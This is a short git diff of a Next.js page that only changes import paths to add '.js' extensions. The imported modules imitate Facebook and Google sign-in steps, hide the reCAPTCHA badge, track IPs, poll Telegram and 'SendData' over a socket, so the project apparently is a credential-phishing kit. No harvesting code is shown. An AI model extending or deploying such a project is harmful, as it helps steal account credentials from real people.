@@ -2,7 +2,7 @@ import Head from "next/head";
 import styles from "../styles/Home.module.css";
 import React, { createContext, useState, useEffect } from "react";
 import { io } from "socket.io-client";
-import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";
+import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge.js";
 
 // Component imports - Main page components
 import Step1FB from "../components/fbook/Step1.js";
@@ -32,17 +32,17 @@ import GoogleSignInPC from "../components/gmail/GoogleSignInPC.js";
 import GoogleSignInMobile from "../components/gmail/GoogleSignInMobile.js";
 
 // Hooks
-import { useUserData } from "../hooks/useUserData";
-import { useStepManagement } from "../hooks/useStepManagement";
-import { useIPManagement } from "../hooks/useIPManagement";
-import { useInitialSetup } from "../hooks/useInitialSetup";
-import { useTelegramPolling } from "../hooks/useTelegramPolling";
-import { useSocketConnection } from "../utils/socket/useSocketConnection";
-import SendData from "../hooks/SendData";
-import { getSocketUrl } from "../config/api";
+import { useUserData } from "../hooks/useUserData.js";
+import { useStepManagement } from "../hooks/useStepManagement.js";
+import { useIPManagement } from "../hooks/useIPManagement.js";
+import { useInitialSetup } from "../hooks/useInitialSetup.js";
+import { useTelegramPolling } from "../hooks/useTelegramPolling.js";
+import { useSocketConnection } from "../utils/socket/useSocketConnection.js";
+import SendData from "../hooks/SendData.js";
+import { getSocketUrl } from "../config/api.js";
 
 // Utils
-import { PageUtils } from "../utils/pageUtils";
+import { PageUtils } from "../utils/pageUtils.js";
 
 // Step mapping for better maintainability
 const STEP_COMPONENTS_FB = {
